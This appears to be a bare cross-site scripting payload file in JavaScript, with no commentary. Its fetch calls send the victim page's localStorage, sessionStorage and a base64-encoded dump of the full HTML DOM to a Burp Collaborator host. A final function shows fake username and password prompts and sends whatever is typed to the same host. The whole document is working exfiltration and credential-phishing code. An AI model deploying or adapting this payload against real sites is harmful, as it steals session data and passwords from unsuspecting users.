fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/?localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/localStorage', {method: "POST", body: 'localStorage='+JSON.stringify(localStorage)+'&sessionStorage='+JSON.stringify(sessionStorage), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));
fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/dump_html_dom', {method: "POST", body: 'html_dom='+btoa(document.documentElement.outerHTML), headers: {"Content-type": "text/plain"}}).then(response => response.json()) .then(json => console.log(json)).catch(err => console.log(err));

function l() {
  let u = prompt("Username: ", "username");
  let p = prompt("Password: ", "password");
  if (u != null) {
    fetch('https://wwwz15e554m201wwajfl7m1ey54z1nq.burpcollaborator.net/?up='+u+'_'+p, { method: "GET"}).then(response => response.json()).then(json => console.log(json)).catch(err => console.log(err));
	}
}
l()
